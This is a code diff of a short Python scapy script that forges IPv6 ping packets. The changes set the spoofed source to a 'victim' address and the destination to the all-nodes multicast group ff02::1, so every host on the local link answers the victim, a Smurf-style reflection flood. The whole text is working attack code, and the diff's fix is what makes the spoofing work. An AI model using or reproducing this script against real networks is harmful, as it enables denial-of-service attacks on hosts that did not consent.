@@ -1,6 +1,4 @@
-from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest
-from scapy.sendrecv import sendp
-
+from scapy.all import *
 
 def build_fake_ping6(victim_ip, target_ip):
     """
@@ -9,7 +7,7 @@ def build_fake_ping6(victim_ip, target_ip):
     :param target_ip: target's ip address
     :return: the fake built packet.
     """
-    ipv6 = IPv6(src=target_ip, dst=victim_ip)
+    ipv6 = IPv6(src=victim_ip, dst=target_ip)
     icmpv6 = ICMPv6EchoRequest(id=1, seq=1, data='hey')
     return ipv6 / icmpv6
 
@@ -22,7 +20,7 @@ def send_fake_ping6(victim_ip, target_ip) -> None:
     :return: None
     """
     fake_icmpv6_req = build_fake_ping6(victim_ip, target_ip)
-    sendp(fake_icmpv6_req, verbose=0)
+    send(fake_icmpv6_req, verbose=0)
 
 
 if __name__ == '__main__':
@@ -32,4 +30,4 @@ if __name__ == '__main__':
     # Group of all nodes
     group_ipv6 = "ff02::1"
 
-    send_fake_ping6(victim_ip=victim_ipv6, target_ip=group_ipv6)
+    send_fake_ping6(victim_ipv6, group_ipv6)
